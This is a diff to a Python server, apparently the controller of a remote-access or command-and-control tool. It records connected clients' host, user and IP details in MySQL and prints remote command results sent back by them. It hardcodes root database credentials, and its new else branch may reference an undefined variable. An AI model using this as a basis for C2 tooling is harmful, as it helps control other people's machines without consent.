@@ -11,6 +11,8 @@ from threading import Thread
 from functions import *
 import subprocess
 
+banner()
+
 class ClientThread(threading.Thread):
 
     def __init__(self, ip, port, clientsocket):
@@ -85,7 +87,8 @@ class ClientThread(threading.Thread):
                 	else:
                         	print("debug")
                 		# Ajoute les informations clientes dans la base de données
-		if "Alive" in str(msg):
+
+		elif "Alive" in str(msg):
 		        infos = str(msg)
 
 		        for items in infos.split(','):
@@ -104,12 +107,12 @@ class ClientThread(threading.Thread):
 
 			db = MySQLdb.connect("localhost","root","toor","clients")
 			cursor = db.cursor()
+			Alive_check = int(0)
 
 			try:
 				cursor.execute("""UPDATE clients.clients SET status = %s, os = %s, computer = %s, lip = %s, user = %s, pip = %s, last_alive = %s WHERE uuid = %s""",('Alive',array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],[alive_date],[uuid]))
 				cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Alive',[uuid]))
 				db.commit()
-				print("[+] Client is alive : " + str(array_infos[1]))
 			except:
 
 				db.rollback()
@@ -119,9 +122,13 @@ class ClientThread(threading.Thread):
 			db.close()
 			#Upgrade BDD avec dernière conenxion
 
+		elif "CMD" in str(msg):
+				formated = str(msg).replace('\\r\\n','\n')
+				remote_command_result = str(formated).replace('\\x82','é').replace('\\x85','à').replace('\\xff',' ')
+				print("[+] Remote command result : " + str(remote_command_result).replace('b"','').replace('CMD:',"").replace("b'","")[:-1])
+
 		else:
-			msg = str(msg).replace("\r\n","\n")
-			print("Unknown format message " + str(msg))
+			print("[-] Unknown format message " + formated)
 
 
 	    if "Init" in str(receive):
